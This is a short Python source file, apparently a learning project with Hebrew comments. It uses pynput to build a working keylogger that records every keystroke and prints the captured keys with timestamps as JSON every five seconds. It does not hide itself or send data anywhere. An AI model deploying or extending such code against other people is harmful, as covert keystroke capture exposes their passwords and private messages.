import threading
from pynput import keyboard
from datetime import datetime
import json

class IKeylogger:
    def __init__(self):
        self.my_list = []
        self.listener = None

    def on_press(self, key):
        try:
            tempKey = str(key.char)
        except AttributeError:
            if key == keyboard.Key.backspace:
                if self.my_list:
                    self.my_list.pop()
                return
            elif key == keyboard.Key.enter:
                tempKey = '\n'
            elif key == keyboard.Key.space:
                tempKey = ' '
            else:
                tempKey = key
        self.my_list.append(tempKey)

    def start_logging(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

class AddToFile(IKeylogger):
    def __init__(self):
        super().__init__()
        self.timestamps = []

# מוסיף את הזמן כול 5 שניות,גם אם הוא לא כתב כלום
    def update_timestamp(self):
        self.timestamps.append(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
        threading.Timer(5, self.update_timestamp).start()

# מדפיס את הjson כול 5 שניות
    def print_json(self):
        if self.my_list:
            print(json.dumps({"keys": self.my_list, "timestamps": self.timestamps}))
        threading.Timer(5, self.print_json).start()

keylogger = AddToFile()
keylogger.start_logging()
keylogger.update_timestamp()
keylogger.print_json()
